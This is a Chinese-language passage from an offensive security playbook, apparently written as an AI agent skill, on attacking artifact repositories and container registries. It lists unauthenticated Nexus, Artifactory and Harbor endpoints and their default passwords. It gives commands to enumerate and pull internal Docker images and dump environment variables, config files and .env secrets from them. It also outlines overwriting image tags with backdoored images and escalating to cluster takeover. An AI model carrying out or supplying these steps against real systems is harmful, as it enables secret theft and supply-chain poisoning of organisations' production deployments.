## 五、制品库与镜像攻击

### 5.1 制品库未授权与弱口令
```
# Nexus: /service/rest/v1/repositories、/service/rest/v1/search（未认证可枚举）
#   admin/admin123 默认口令；API key 泄露面
# Artifactory: /api/repositories、/api/search（弱口令/未授权）
# 通用: 匿名可读=可拉包（含内部私有包）→ 收集内部包名做依赖混淆(4.1)
#   匿名可写=可投毒 → 直接替换内部包
```

### 5.2 Docker Registry 攻击
```bash
# v2 API（默认可能无鉴权或弱口令）
curl http://registry:5000/v2/_catalog            # 全部镜像列表
curl http://registry:5000/v2/<repo>/tags/list    # 镜像tag
# 拉取镜像并提取层内敏感数据（配置/环境变量/密钥）
docker pull internal-registry:5000/app:latest
docker history --no-trunc internal-registry:5000/app:latest
docker run --rm -it --entrypoint=sh internal-registry:5000/app:latest
env ; cat /etc/nginx/conf.d/* ; find / -name ".env"
# 篡改/投毒: 有写权限 → 上传恶意镜像覆盖 tag → 下次部署即中招
# 分发冒名: 内网应用配置的 image 指向可写 registry → 上游污染
# 高价值: 镜像内含构建期 secrets（历史层会保留已删 secret）
#   dive / skopeo 逐层审计: skopeo copy docker://img dir://out
```

### 5.3 Harbor 漏洞利用
```
# CVE-2019-16097（任意管理员创建，旧版）: 注册用户 → 提升管理员 → 镜像全控
# CVE-2021-37281(反序列化RCE)/2021-37278等（按版本核对）
# 常见: 默认 admin/Harbor12345、未认证 /api/v2.0/projects、复制规则(Replication)
#       泄露远端 registry 凭据
# 利用链: 控制 Harbor → 篡改生产镜像 → 供应链投毒（见5.2）
```

### 5.4 镜像供应链→集群接管链
```
# 1) 拿 registry 写权限 → 覆盖应用镜像（恶意后门层）
# 2) 集群自动拉取新镜像 → 后门容器进集群（带 serviceAccount 权限）
# 3) 从容器逃逸/挂载 → 集群控制平面（联动container-security-testing技能）
# 关键点: 镜像不签名/不验证摘要 → 投毒无痕
```

